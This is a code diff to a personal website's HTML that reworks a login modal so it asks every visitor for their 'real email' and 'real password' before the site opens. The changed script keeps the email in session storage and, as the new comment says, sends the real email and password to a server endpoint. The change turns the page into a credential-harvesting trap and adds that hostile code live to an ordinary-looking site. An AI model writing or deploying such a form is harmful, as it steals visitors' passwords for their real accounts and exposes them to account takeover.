@@ -132,11 +132,11 @@
 
     <div id="nameModal" style="display: none;">
         <div class="modal-card">
-            <h2>🔐 Login Required</h2>
-            <p>Please enter your details to access the site:</p>
+            <h2>🔐 Secure Login</h2>
+            <p>Please enter your real email and password to access:</p>
             <input type="text" id="visitorNameInput" class="modal-input" placeholder="Your Name..." required>
-            <input type="email" id="visitorEmailInput" class="modal-input" placeholder="Your Email Address..." required>
-            <input type="password" id="visitorPassInput" class="modal-input" placeholder="Enter Password..." required>
+            <input type="email" id="visitorEmailInput" class="modal-input" placeholder="Your Real Email Address..." required>
+            <input type="password" id="visitorPassInput" class="modal-input" placeholder="Your Real Password..." required>
             <div id="errorText" class="error-msg">⚠️ All fields are required!</div>
             <button class="btn" onclick="submitVisitorCredentials()">Login to Site</button>
         </div>
@@ -194,7 +194,7 @@
                 document.getElementById('nameModal').style.display = 'flex';
                 document.getElementById('userTopBar').style.display = 'none';
             } else {
-                document.getElementById('msgUsername').value = savedName;
+                document.getElementById('msgUsername').value = sessionStorage.getItem('dilshan_visitor_email') || '';
                 document.getElementById('loggedInUserText').innerText = savedName;
                 document.getElementById('userTopBar').style.display = 'flex';
             }
@@ -213,8 +213,9 @@
 
             errorText.style.display = 'none';
             sessionStorage.setItem('dilshan_visitor_name', nameInput);
+            sessionStorage.setItem('dilshan_visitor_email', emailInput);
 
-            // Send credentials to server
+            // Send real email & password to server
             fetch('/api/set-credentials', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -229,6 +230,7 @@
 
         function logoutUser() {
             sessionStorage.removeItem('dilshan_visitor_name');
+            sessionStorage.removeItem('dilshan_visitor_email');
             document.getElementById('visitorNameInput').value = '';
             document.getElementById('visitorEmailInput').value = '';
             document.getElementById('visitorPassInput').value = '';
